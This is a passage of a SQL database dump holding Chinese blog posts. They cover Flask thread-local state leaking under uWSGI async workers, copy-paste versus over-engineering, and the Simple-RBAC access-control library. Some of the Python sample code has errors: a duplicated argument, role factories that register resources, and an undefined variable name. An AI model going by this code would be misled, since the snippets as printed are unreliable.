ID”，这一点从 <a class="reference external" href="https://github.com/mitsuhiko/werkzeug/blob/b98631187dd32deecb3d6b4b94665e0599ca9da7/werkzeug/local.py#L18-L24">Werkzeug Local</a> 可以看到。但并非所有异步 WSGI Server 都使用 Greenlet 作为协程库，我所使用的 uWSGI 就是使用自己实现的 uGreen 作为微线程的。于是上述问题就出现了。</p>\n<p>和 Flask 的这个问题相关的是 <tt class="docutils literal">flask.globals</tt> 模块中的两个 <tt class="docutils literal">werkzeug.local.LocalStack</tt> 实例，替换它们的 <tt class="docutils literal">__ident_func__</tt> 属性应该可以解决问题。但我没有找到 uWSGI 默认使用的 uGreen 对应的 Thread Identity 获取方法。或许对于使用 uWSGI 运行的应用来说，不要去使用异步是个更好的选择吧。当然，不怕麻烦的话也可以给 uWSGI 编译使用 Greenlet 调度的异步支持插件。</p>', '2014-11-06 23:43:08', 6, '2012-06-02 08:12:00', '2012-06-02 08:12:00', 0, '[["Thread", 0.4390168856997175], ["Werkzeug", 0.23639370768446324], ["\\u7ebf\\u7a0b", 0.23639370768446324], ["Local", 0.23639370768446324], ["Identity", 0.23639370768446324], ["WSGI", 0.2026231780152542], ["\\u5f02\\u6b65", 0.19496241320677965], ["\\u4f7f\\u7528", 0.17861073220073445], ["Flask", 0.1688526483460452], ["\\u5bf9\\u8c61", 0.14997426289525423], ["Server", 0.13508211867683614], ["flask", 0.13508211867683614], ["uWSGI", 0.13508211867683614], ["Greenlet", 0.1013115890076271], ["ID", 0.1013115890076271], ["\\u8bf7\\u6c42", 0.10049562156737288], ["\\u5f53\\u524d", 0.07859162671440678], ["\\u4f5c\\u4e3a", 0.07119336410084745], ["\\u6b64\\u5217", 0.06944203242655367], ["__", 0.06754105933841807]]', NULL, NULL, '这个标题有点不太准确，其实应该说：慎用异步 WSGI Server 运行基于 Werkzeug 的应用。或者更宽泛一点——慎用异步 WSGI Server 运行使用 Thread Local 的应用。 Flask 是基于 Werkzeug 的故也在此列。貌似使用 Werkzeug 作为底层 WSGI 库的框架还有国内 limodou 老师的 Uliweb 。而其他使用 Thread Local 的 WSGI Application 不计其数，Bottle、web.py 都在此列。但我没有测试过其他的，仅仅掉下过 Flask 的坑。\n\n这个坑问题就出在 Werkzeug 的 Thread Local 上。用过 Flask 的同学应该不会忘记其便捷的 flask.request 、 flask.g 、 flask.session 等对象。引用的时候就像使用单例对象一样，但实际上对它们的所有赋值操作都只会影响到当前请求（当前线程）。Thread Local 模式的实现一定要有一个 Thread Identity 作为标识，由此产生的 Proxy 对象会根据这个标识创建多个独立的数据空间。我们访问代理对象的时候就像访问全局对象，但代理对象会将消息分发到 Thread Identity 对应的真实对象上。\n一般这个实现都会使用系统提供的当前线程 ID 作为 Thread Identity，于是在使用多线程的 Web 服务器上，由于每个请求独享一个线程，每个 Thread Local 的数据空间也就为一个请求所独享。这是 Flask（Werkzeug）可以正常工作的假设前提。但异步 WSGI Server 一般不会给每个请求分配一个线程。为了减少内核调度线程的开销，这类服务器软件一般使用协同式调度——若干个请求都在同一个进程的主线程中运行，遇到 IO 阻塞（例如等待网络）则挂起当前帧栈，切换到另一个帧栈执行，整个过程都是协同式的，并没有时间片轮转这些抢占的做法。如此一来，用线程 ID 作为 Thread Identity 的所有 Thread Local 对象就会退化成单例对象，这也是我遇到的灵异现象的原因：在宿舍登录网站，远在图书馆的电脑会同步登录。\n说到底还是 Thread Identity 选取导致的问题。其实 Werkzeug 在设计的时候有考虑到这个问题，其默认的 Thread Identity 工厂选取就优先采用 Greenlet 的“当前协程 ID”，这一点从 Werkzeug Local 可以看到。但并非所有异步 WSGI Server 都使用 Greenlet 作为协程库，我所使用的 uWSGI 就是使用自己实现的 uGreen 作为微线程的。于是上述问题就出现了。\n和 Flask 的这个问题相关的是 flask.globals 模块中的两个 werkzeug.local.LocalStack 实例，替换它们的 __ident_func__ 属性应该可以解决问题。但我没有找到 uWSGI 默认使用的 uGreen 对应的 Thread Identity 获取方法。或许对于使用 uWSGI 运行的应用来说，不要去使用异步是个更好的选择吧。当然，不怕麻烦的话也可以给 uWSGI 编译使用 Greenlet 调度的异步支持插件。', NULL, NULL, NULL);
INSERT INTO `post` (`id`, `url`, `title`, `content`, `created_at`, `blog_id`, `updated_at`, `published_at`, `hide`, `keywords`, `clicks`, `recommend`, `pure_content`, `need_analysis`, `published_at_exceed`, `updated_at_exceed`) VALUES
(83, 'https://blog.tonyseek.com/post/copy-and-paste-is-better/', '复制粘贴模式与过度设计', '<p>这几天在给 <a class="reference external" href="https://github.tonyseek.com/simple-rbac/">Simple RBAC</a> 添加 contrib，其中有一个功能需要从用户实体类产生 named tuple 作为访问控制列表中的资源标识。因为“类”在原型链层次上的特殊性，我还需要自动将实体类的“类”所对应资源注册为实体类的“实例”所对应资源的 parent，这样我就可以很简单的结合 assertion 让一篇文章只能被它的作者或者管理员修改：</p>\n\n<figure class="code"><div class="highlight"><pre><span class="kn">from</span> <span class="nn">myapp</span> <span class="kn">import</span> <span class="n">models</span><span class="p">,</span> <span class="n">context</span>\n\n<span class="k">def</span> <span class="nf">is_owner_assertion</span><span class="p">(</span><span class="n">acl</span><span class="p">,</span> <span class="n">role</span><span class="p">,</span> <span class="n">operation</span><span class="p">,</span> <span class="n">resource</span><span class="p">):</span>\n    <span class="n">article</span> <span class="o">=</span> <span class="n">models</span><span class="o">.</span><span class="n">Article</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">resource</span><span class="o">.</span><span class="n">id</span><span class="p">)</span>\n    <span class="k">return</span> <span class="n">article</span><span class="o">.</span><span class="n">owner</span> <span class="ow">is</span> <span class="n">context</span><span class="o">.</span><span class="n">current_user</span>\n\n<span class="n">acl</span><span class="o">.</span><span class="n">allow</span><span class="p">(</span><span class="s">&quot;actived-user&quot;</span><span class="p">,</span> <span class="s">&quot;edit&quot;</span><span class="p">,</span> <span class="n">models</span><span class="o">.</span><span class="n">Article</span><span class="p">,</span> <span class="n">is_owner_assertion</span><span class="p">)</span>\n<span class="n">acl</span><span class="o">.</span><span class="n">allow</span><span class="p">(</span><span class="s">&quot;admin&quot;</span><span class="p">,</span> <span class="s">&quot;edit&quot;</span><span class="p">)</span>\n\n<span class="c"># ...</span>\n\n<span class="k">def</span> <span class="nf">some_function</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>\n    <span class="n">model</span> <span class="o">=</span> <span class="n">models</span><span class="o">.</span><span class="n">Article</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="nb">id</span><span class="p">)</span>\n    <span class="k">if</span> <span class="ow">not</span> <span class="n">acl</span><span class="o">.</span><span class="n">is_allowed</span><span class="p">(</span><span class="s">&quot;actived-user&quot;</span><span class="p">,</span> <span class="s">&quot;edit&quot;</span><span class="p">,</span> <span class="n">model</span><span class="p">):</span>\n        <span class="k">raise</span> <span class="n">BadPermission</span>\n</pre></div>\n</figure><p>如果 <tt class="docutils literal">is_owner_assertion</tt> 断言失败，所添加的 allow 规则就不会生效。</p>\n<p>为了实现这个目标，我考虑编写一个 Access Control List Rigistry 的代理类来完成这个工作。其中对于实体类（实体类的实例）到资源标识元组的转化，我交给了工厂函数：</p>\n<figure class="code"><div class="highlight"><pre><span class="kn">import</span> <span class="nn">functools</span>\n<span class="kn">import</span> <span class="nn">collections</span>\n\n\n<span class="n">identity</span> <span class="o">=</span> <span class="n">collections</span><span class="o">.</span><span class="n">namedtuple</span><span class="p">(</span><span class="s">&quot;identity&quot;</span><span class="p">,</span> <span class="p">[</span><span class="s">&quot;type&quot;</span><span class="p">,</span> <span class="s">&quot;cls&quot;</span><span class="p">,</span> <span class="s">&quot;id&quot;</span><span class="p">])</span>\n<span class="n">role_identity</span> <span class="o">=</span> <span class="n">functools</span><span class="o">.</span><span class="n">partial</span><span class="p">(</span><span class="n">identity</span><span class="p">,</span> <span class="s">&quot;role-model&quot;</span><span class="p">)</span>\n<span class="n">resource_identity</span> <span class="o">=</span> <span class="n">functools</span><span class="o">.</span><span class="n">partial</span><span class="p">(</span><span class="n">identity</span><span class="p">,</span> <span class="s">&quot;resource-model&quot;</span><span class="p">)</span>\n\n<span class="n">getfullname</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">m</span><span class="p">:</span> <span class="s">&quot;</span><span class="si">%s</span><span class="s">.</span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">__module__</span><span class="p">,</span> <span class="n">m</span><span class="o">.</span><span class="n">__name__</span><span class="p">)</span>\n<span class="n">empty_factory</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">acl</span><span class="p">,</span> <span class="n">obj</span><span class="p">:</span> <span class="n">obj</span>\n\n\n<span class="k">def</span> <span class="nf">model_role_factory</span><span class="p">(</span><span class="n">acl</span><span class="p">,</span> <span class="n">obj</span><span class="p">):</span>\n    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="nb">type</span><span class="p">):</span>\n        <span class="n">identity</span> <span class="o">=</span> <span class="n">role_identity</span><span class="p">(</span><span class="n">getfullname</span><span class="p">(</span><span class="n">obj</span><span class="p">),</span> <span class="bp">None</span><span class="p">)</span>\n        <span class="n">acl</span><span class="o">.</span><span class="n">add_resource</span><span class="p">(</span><span class="n">identity</span><span class="p">)</span>\n    <span class="k">else</span><span class="p">:</span>\n        <span class="n">class_fullname</span> <span class="o">=</span> <span class="n">getfullname</span><span class="p">(</span><span class="n">obj</span><span class="o">.</span><span class="n">__class__</span><span class="p">)</span>\n        <span class="n">identity</span> <span class="o">=</span> <span class="n">role_identity</span><span class="p">(</span><span class="n">class_fullname</span><span class="p">,</span> <span class="n">obj</span><span class="o">.</span><span class="n">id</span><span class="p">)</span>\n        <span class="n">identity_type</span> <span class="o">=</span> <span class="n">role_identity</span><span class="p">(</span><span class="n">class_fullname</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>\n        <span class="n">acl</span><span class="o">.</span><span class="n">add_resource</span><span class="p">(</span><span class="n">acl</span><span class="p">,</span> <span class="n">identity</span><span class="p">,</span> <span class="n">parents</span><span class="o">=</span><span class="p">[</span><span class="n">identity_type</span><span class="p">])</span>\n    <span class="k">return</span> <span class="n">identity</span>\n\n\n<span class="k">def</span> <span class="nf">model_resource_factory</span><span class="p">(</span><span class="n">acl</span><span class="p">,</span> <span class="n">obj</span><span class="p">):</span>\n    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="nb">type</span><span class="p">):</span>\n        <span class="n">identity</span> <span class="o">=</span> <span class="n">resource_identity</span><span class="p">(</span><span class="n">getfullname</span><span class="p">(</span><span class="n">obj</span><span class="p">),</span> <span class="bp">None</span><span class="p">)</span>\n        <span class="n">acl</span><span class="o">.</span><span class="n">add_resource</span><span class="p">(</span><span class="n">identity</span><span class="p">)</span>\n    <span class="k">else</span><span class="p">:</span>\n        <span class="n">class_fullname</span> <span class="o">=</span> <span class="n">getfullname</span><span class="p">(</span><span class="n">obj</span><span class="o">.</span><span class="n">__class__</span><span class="p">)</span>\n        <span class="n">identity</span> <span class="o">=</span> <span class="n">resource_identity</span><span class="p">(</span><span class="n">class_fullname</span><span class="p">,</span> <span class="n">obj</span><span class="o">.</span><span class="n">id</span><span class="p">)</span>\n        <span class="n">identity_type</span> <span class="o">=</span> <span class="n">resource_identity</span><span class="p">(</span><span class="n">class_fullname</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>\n        <span class="n">acl</span><span class="o">.</span><span class="n">add_resource</span><span class="p">(</span><span class="n">acl</span><span class="p">,</span> <span class="n">identity</span><span class="p">,</span> <span class="n">parents</span><span class="o">=</span><span class="p">[</span><span class="n">identity_type</span><span class="p">])</span>\n    <span class="k">return</span> <span class="n">identity</span>\n</pre></div>\n</figure><p>这代码看起来怪怪的， <tt class="docutils literal">model_role_factory</tt> 和 <tt class="docutils literal">model_resource_factory</tt> 怎么看怎么相似 —— 我几乎是使用 <a class="reference external" href="https://en.wikipedia.org/wiki/Copy_and_paste_programming">“复制粘贴模式”（Copy and Paste Pattern）</a> 来编写它们的。于是我本着无聊到底的精神，将它改写成了下面这个样子：</p>\n<figure class="code"><div class="highlight"><pre><span class="k">class</span> <span class="nc">ModelIdentityFactory</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>\n    <span class="sd">&quot;&quot;&quot;A factory to create role or resource from model.&quot;&quot;&quot;</span>\n\n    <span class="k">class</span> <span class="nc">Role</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>\n        <span class="n">make</span> <span class="o">=</span> <span class="n">role_identity</span>\n        <span class="n">add</span> <span class="o">=</span> <span class="k">lambda</span> <span class="bp">self</span><span class="p">,</span> <span class="n">acl</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">:</span> <span class="n">acl</span><span class="o">.</span><span class="n">add_role</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">)</span>\n\n    <span class="k">class</span> <span class="nc">Resource</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>\n        <span class="n">make</span> <span class="o">=</span> <span class="n">resource_identity</span>\n        <span class="n">add</span> <span class="o">=</span> <span class="k">lambda</span> <span class="bp">self</span><span class="p">,</span> <span class="n">acl</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">:</span> <span class="n">acl</span><span class="o">.</span><span class="n">add_resource</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">)</span>\n\n    <span class="n">identity_types</span> <span class="o">=</span> <span class="p">{</span><span class="s">''role''</span><span class="p">:</span> <span class="n">Role</span><span class="p">(),</span> <span class="s">''resource''</span><span class="p">:</span> <span class="n">Resource</span><span class="p">()}</span>\n    <span class="n">getname</span> <span class="o">=</span> <span class="nb">staticmethod</span><span class="p">(</span><span class="k">lambda</span> <span class="n">m</span><span class="p">:</span> <span class="s">&quot;</span><span class="si">%s</span><span class="s">.</span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> \\\n            <span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">__module__</span><span class="p">,</span> <span class="n">m</span><span class="o">.</span><span class="n">__name__</span><span class="p">))</span>\n\n    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">identity_type</span><span class="p">,</span> <span class="n">id_attr</span><span class="o">=</span><span class="s">&quot;id&quot;</span><span class="p">):</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">id_attr</span> <span class="o">=</span> <span class="n">id_attr</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">identity</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">identity_types</span><span class="p">[</span><span class="n">identity_type</span><span class="p">]</span>\n\n    <span class="k">def</span> <span class="nf">__call__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">acl</span><span class="p">,</span> <span class="n">model</span><span class="p">):</span>\n        <span class="k">assert</span> <span class="n">types</span><span class="o">.</span><span class="n">ClassType</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">(</span><span class="n">model</span><span class="p">,</span> <span class="nb">type</span><span class="p">(</span><span class="n">model</span><span class="p">)),</span> \\\n                <span class="s">&quot;not support to old style class&quot;</span>\n\n        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">model</span><span class="p">,</span> <span class="nb">type</span><span class="p">):</span>\n            <span class="n">identity</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">identity</span><span class="o">.</span><span class="n">make</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">getname</span><span class="p">(</span><span class="n">model</span><span class="p">),</span> <span class="bp">None</span><span class="p">)</span>\n            <span class="bp">self</span><span class="o">.</span><span class="n">identity</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">acl</span><span class="p">,</span> <span class="n">identity</span><span class="p">)</span>\n        <span class="k">else</span><span class="p">:</span>\n            <span class="c"># get name</span>\n            <span class="n">class_name</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">getname</span><span class="p">(</span><span class="nb">type</span><span class="p">(</span><span class="n">model</span><span class="p">))</span>\n            <span class="n">instance_id</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">model</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">id_attr</span><span class="p">)</span>\n            <span class="c"># create identity</span>\n            <span class="n">identity</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">identity</span><span class="o">.</span><span class="n">make</span><span class="p">(</span><span class="n">identity_clsname</span><span class="p">,</span>\n                    <span class="n">instance_id</span><span class="p">)</span>\n            <span class="n">identity_type</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">identity</span><span class="o">.</span><span class="n">make</span><span class="p">(</span><span class="n">identity_clsname</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>\n            <span class="c"># add into registry</span>\n            <span class="bp">self</span><span class="o">.</span><span class="n">identity</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">acl</span><span class="p">,</span> <span class="n">identity</span><span class="p">,</span> <span class="n">parents</span><span class="o">=</span><span class="p">[</span><span class="n">identity_type</span><span class="p">])</span>\n\n        <span class="k">return</span> <span class="n">identity</span>\n\n\n<span class="n">model_role_factory</span> <span class="o">=</span> <span class="n">ModelIdentityFactory</span><span class="p">(</span><span class="s">&quot;role&quot;</span><span class="p">)</span>\n<span class="n">model_resource_factory</span> <span class="o">=</span> <span class="n">ModelIdentityFactory</span><span class="p">(</span><span class="s">&quot;resource&quot;</span><span class="p">)</span>\n</pre></div>\n</figure><p>好坏的味道啊！充满了形式上的 OO，但是一点也不 Pythonic。此时此刻我知道我写的代码是什么意思，但是除了我之外其他人还能读懂么？又或者来日我还能读懂自己写的这片代码么？一个如此简单的需求，为了不写重复的代码，而写了更多更复杂的代码，我想这一定是本末倒置了。</p>\n<p>我回滚了版本库，恢复了第一个版本。</p>\n<p>有许多权威、教条，给我们灌输了很多思想，这些思想告诉我们重复代码是不好的，告诉我们耦合是不好的，要消除它们。但是无数的事实证明，消除了一处重复代码，就会在另一处产生新的代码；消除了一处耦合，就会产生更复杂的中间层耦合。如果没有目的的去遵循这些教条，我们只会在烂泥坑里越挣扎陷地越深。</p>\n<p>那我们要要消除重复代码吗？或者说我们还要引入解耦层吗？我觉得有个简单的标准可以判断：</p>\n<ul class="simple">\n<li>我这么做之后，问题是变得更简单了还是更复杂了？代码是变得更清晰了还是更晦涩了？</li>\n<li>如果我必须付出增加复杂度的代码，那有额外的收益（比如增加可测试性）吗？</li>\n</ul>\n<p>说到底，还是《Unix 编程艺术》所提出的“胶合层”问题。更高层次的抽象，会导致更厚的胶合层，而胶合层本身也是一种复杂。</p>\n<blockquote>\nKeep it simple and stupid.</blockquote>\n<p>我觉得这句话是真理。</p>', '2014-11-06 23:43:08', 6, '2012-05-16 07:52:00', '2012-05-16 07:52:00', 0, '[["identity", 0.9137401913044585], ["acl", 0.38072507971019104], ["resource", 0.3616888257246815], ["model", 0.34265257173917196], ["self", 0.28554380978264327], ["type", 0.2665075557971337], ["role", 0.2665075557971337], ["id", 0.2474713018116242], ["class", 0.2474713018116242], ["obj", 0.22843504782611462], ["add", 0.20939879384060506], ["__", 0.19036253985509552], ["factory", 0.15229003188407642], ["\\u4ee3\\u7801", 0.12566701711117834], [".__", 0.11421752391305731], ["None", 0.11421752391305731], ["fullname", 0.11421752391305731], ["def", 0.11421752391305731], ["\\u5b9e\\u4f53\\u7c7b", 0.09518126992754776], ["make", 0.09518126992754776]]', NULL, NULL, '这几天在给 Simple RBAC 添加 contrib，其中有一个功能需要从用户实体类产生 named tuple 作为访问控制列表中的资源标识。因为“类”在原型链层次上的特殊性，我还需要自动将实体类的“类”所对应资源注册为实体类的“实例”所对应资源的 parent，这样我就可以很简单的结合 assertion 让一篇文章只能被它的作者或者管理员修改：\n\nfrom myapp import models, context\n\ndef is_owner_assertion(acl, role, operation, resource):\n    article = models.Article.query.get(resource.id)\n    return article.owner is context.current_user\n\nacl.allow("actived-user", "edit", models.Article, is_owner_assertion)\nacl.allow("admin", "edit")\n\n# ...\n\ndef some_function(id):\n    model = models.Article.query.get(id)\n    if not acl.is_allowed("actived-user", "edit", model):\n        raise BadPermission\n\n如果 is_owner_assertion 断言失败，所添加的 allow 规则就不会生效。\n为了实现这个目标，我考虑编写一个 Access Control List Rigistry 的代理类来完成这个工作。其中对于实体类（实体类的实例）到资源标识元组的转化，我交给了工厂函数：\nimport functools\nimport collections\n\n\nidentity = collections.namedtuple("identity", ["type", "cls", "id"])\nrole_identity = functools.partial(identity, "role-model")\nresource_identity = functools.partial(identity, "resource-model")\n\ngetfullname = lambda m: "%s.%s" % (m.__module__, m.__name__)\nempty_factory = lambda acl, obj: obj\n\n\ndef model_role_factory(acl, obj):\n    if isinstance(obj, type):\n        identity = role_identity(getfullname(obj), None)\n        acl.add_resource(identity)\n    else:\n        class_fullname = getfullname(obj.__class__)\n        identity = role_identity(class_fullname, obj.id)\n        identity_type = role_identity(class_fullname, None)\n        acl.add_resource(acl, identity, parents=[identity_type])\n    return identity\n\n\ndef model_resource_factory(acl, obj):\n    if isinstance(obj, type):\n        identity = resource_identity(getfullname(obj), None)\n        acl.add_resource(identity)\n    else:\n        class_fullname = getfullname(obj.__class__)\n        identity = resource_identity(class_fullname, obj.id)\n        identity_type = resource_identity(class_fullname, None)\n        acl.add_resource(acl, identity, parents=[identity_type])\n    return identity\n\n这代码看起来怪怪的， model_role_factory 和 model_resource_factory 怎么看怎么相似 —— 我几乎是使用 “复制粘贴模式”（Copy and Paste Pattern） 来编写它们的。于是我本着无聊到底的精神，将它改写成了下面这个样子：\nclass ModelIdentityFactory(object):\n    """A factory to create role or resource from model."""\n\n    class Role(object):\n        make = role_identity\n        add = lambda self, acl, *args: acl.add_role(*args)\n\n    class Resource(object):\n        make = resource_identity\n        add = lambda self, acl, *args: acl.add_resource(*args)\n\n    identity_types = {''role'': Role(), ''resource'': Resource()}\n    getname = staticmethod(lambda m: "%s.%s" % \\\n            (m.__module__, m.__name__))\n\n    def __init__(self, identity_type, id_attr="id"):\n        self.id_attr = id_attr\n        self.identity = self.identity_types[identity_type]\n\n    def __call__(self, acl, model):\n        assert types.ClassType not in (model, type(model)), \\\n                "not support to old style class"\n\n        if isinstance(model, type):\n            identity = self.identity.make(self.getname(model), None)\n            self.identity.add(acl, identity)\n        else:\n            # get name\n            class_name = self.getname(type(model))\n            instance_id = getattr(model, self.id_attr)\n            # create identity\n            identity = self.identity.make(identity_clsname,\n                    instance_id)\n            identity_type = self.identity.make(identity_clsname, None)\n            # add into registry\n            self.identity.add(acl, identity, parents=[identity_type])\n\n        return identity\n\n\nmodel_role_factory = ModelIdentityFactory("role")\nmodel_resource_factory = ModelIdentityFactory("resource")\n\n好坏的味道啊！充满了形式上的 OO，但是一点也不 Pythonic。此时此刻我知道我写的代码是什么意思，但是除了我之外其他人还能读懂么？又或者来日我还能读懂自己写的这片代码么？一个如此简单的需求，为了不写重复的代码，而写了更多更复杂的代码，我想这一定是本末倒置了。\n我回滚了版本库，恢复了第一个版本。\n有许多权威、教条，给我们灌输了很多思想，这些思想告诉我们重复代码是不好的，告诉我们耦合是不好的，要消除它们。但是无数的事实证明，消除了一处重复代码，就会在另一处产生新的代码；消除了一处耦合，就会产生更复杂的中间层耦合。如果没有目的的去遵循这些教条，我们只会在烂泥坑里越挣扎陷地越深。\n那我们要要消除重复代码吗？或者说我们还要引入解耦层吗？我觉得有个简单的标准可以判断：\n\n我这么做之后，问题是变得更简单了还是更复杂了？代码是变得更清晰了还是更晦涩了？\n如果我必须付出增加复杂度的代码，那有额外的收益（比如增加可测试性）吗？\n\n说到底，还是《Unix 编程艺术》所提出的“胶合层”问题。更高层次的抽象，会导致更厚的胶合层，而胶合层本身也是一种复杂。\n\nKeep it simple and stupid.\n我觉得这句话是真理。', NULL, NULL, NULL),
(84, 'https://blog.tonyseek.com/post/my-simple-rbac/', '写了一个 RBAC 权限管理工具', '<p>前几天在邮件列表看到大家在说有没有好用的权限管理工具，有人说 Zend_Acl 不错。我看了下官网文档，貌似是挺不错的，用起来很方便。可惜 Zend_Acl 是 PHP 的，我于是兴起模仿它的用法，写了一个 Python 版的。</p>\n\n<p>想不到好名字，就叫 <tt class="docutils literal"><span class="pre">Simple-RBAC</span></tt> 了。目前只实现了 Access Control List 部分（当然这也是核心部分），等赶完这批作业再实现 Flask 插件神马的。Flask 插件里面有一个类似的，叫 Flask-Principal，这个更简洁更好用，但是不支持角色继承、资源继承什么的。Simple-RBAC 实现了角色和资源的继承，而且可以通过一个 assertion 附加条件，给规则生效指定上下文（比如早上九点到十点规则才生效）。设计思路方面，和 Zend_Acl 基本一致。</p>\n<p>和 Zend_Acl 不一样的一点是关于类型的设计，Zend_Acl 使用的是我感到很恶心的接口契约，用 PHP 语言中的 interface 定义 Role、Resource 等。我不是讨厌接口，如果在 Java 中这么写我会觉得很正常，但是在 PHP 这样的动态语言中还去用接口约束类型，我觉得很多此一举。所以在 Simple-RBAC 中我采取了“会游泳的都是鸭子”策略——没有约束 Role、Resource 的类型签名。</p>\n<p>我写的 <a class="reference external" href="https://github.com/tonyseek/simple-rbac/blob/master/examples/acl.py">使用范例</a> 中 Role 和 Resource 都是直接使用字符串的。实际上如果有需要，我们也可以定义自己的 Role 和 Resource 类型，比如一个 SQLAlchemy 映射过的 Model 类 —— 只要它在 set 容器里是安全的，也就是实现了 <tt class="docutils literal">__eq__</tt> 和 <tt class="docutils literal">__hash__</tt> 方法（所谓的 hashable）。等晚点我也会往里面加一个 <tt class="docutils literal">contrib</tt> 包，用来包含 SQLAlchemy Model、Django Model 的 Role 和 Resource 类定义，这样用起来就更省事。不过就我个人看法，我更建议使用字符串，因为字符串更简单、通用，无论开发者使用的是数据库中保存的角色表还是配置文件中定义的静态角色，获取一个能唯一标识角色、资源的字符串总是可以的 —— 角色和资源总有名字吧。</p>\n<p>目前项目托管在 <a class="reference external" href="https://github.com/tonyseek/simple-rbac">Github</a> ，用 MIT 许可协议开放源代码。可以克隆到本地安装，或者直接用 pip 从 git 仓库安装。单元测试也已经写好，用 <tt class="docutils literal">setup.py test</tt> 可以运行。</p>\n<p>其实最希望的就是有兴趣的同学可以试用一下（我也会在我的下个项目中试用），如果有意见或者建议可以通过 <a class="reference external" href="http://www.tonyseek.com">各种</a> 方式联系我，或者向 github 托管的仓库发送 issues，又或者是 fork 下来然后推 pull request。好吧，我承认 github 的这些功能我大部分都没用过，想试一下。</p>\n<p>具体的使用方法，可以看 <a class="reference external" href="https://github.tonyseek.com/simple-rbac/">项目主页</a> 或者单元测试，我没写详细的文档，因为觉得本来就是个挺简单的东西。</p>', '2014-11-06 23:43:08', 6, '2012-05-09 13:46:00', '2012-05-09 13:46:00', 0, '[["Role", 0.19158281254647436], ["Resource", 0.19158281254647436], ["Acl", 0.19158281254647436], ["Zend", 0.19158281254647436], ["__", 0.15326625003717947], ["\\u89d2\\u8272", 0.13504521507076922], ["Flask", 0.1149496875278846], ["Simple", 0.1149496875278846], ["PHP", 0.1149496875278846], ["RBAC", 0.1149496875278846], ["Model", 0.1149496875278846], ["\\u5b57\\u7b26\\u4e32", 0.11048043491333334], ["\\u5b9a\\u4e49", 0.09222840147910256], ["\\u53ef\\u4ee5", 0.08987485261948717], ["\\u4f7f\\u7528", 0.08685192197673076], ["\\u63a5\\u53e3", 0.08351674898432693], ["\\u6216\\u8005", 0.08292761652179487], ["\\u63d2\\u4ef6", 0.08022040571089743], ["\\u5355\\u5143\\u6d4b\\u8bd5", 0.07663312501858974], ["SQLAlchemy", 0.07663312501858974]]', NULL, NULL, '前几天在邮件列表看到大家在说有没有好用的权限管理工具，有人说 Zend_Acl 不错。我看了下官网文档，貌似是挺不错的，用起来很方便。可惜 Zend_Acl 是 PHP 的，我于是兴起模仿它的用法，写了一个 Python 版的。\n\n想不到好名字，就叫 Simple-RBAC 了。目前只实现了 Access Control List 部分（当然这也是核心部分），等赶完这批作业再实现 Flask 插件神马的。Flask 插件里面有一个类似的，叫 Flask-Principal，这个更简洁更好用，但是不支持角色继承、资源继承什么的。Simple-RBAC 实现了角色和资源的继承，而且可以通过一个 assertion 附加条件，给规则生效指定上下文（比如早上九点到十点规则才生效）。设计思路方面，和 Zend_Acl 基本一致。\n和 Zend_Acl 不一样的一点是关于类型的设计，Zend_Acl 使用的是我感到很恶心的接口契约，用 PHP 语言中的 interface 定义 Role、Resource 等。我不是讨厌接口，如果在 Java 中这么写我会觉得很正常，但是在 PHP 这样的动态语言中还去用接口约束类型，我觉得很多此一举。所以在 Simple-RBAC 中我采取了“会游泳的都是鸭子”策略——没有约束 Role、Resource 的类型签名。\n我写的 使用范例 中 Role 和 Resource 都是直接使用字符串的。实际上如果有需要，我们也可以定义自己的 Role 和 Resource 类型，比如一个 SQLAlchemy 映射过的 Model 类 —— 只要它在 set 容器里是安全的，也就是实现了 __eq__ 和 __hash__ 方法（所谓的 hashable）。等晚点我也会往里面加一个 contrib 包，用来包含 SQLAlchemy Model、Django Model 的 Role 和 Resource 类定义，这样用起来就更省事。不过就我个人看法，我更建议使用字符串，因为字符串更简单、通用，无论开发者使用的是数据库中保存的角色表还是配置文件中定义的静态角色，获取一个能唯一标识角色、资源的字符串总是可以的 —— 角色和资源总有名字吧。\n目前项目托管在 Github ，用 MIT 许可协议开放源代码。可以克隆到本地安装，或者直接用 pip 从 git 仓库安装。单元测试也已经写好，用 setup.py test 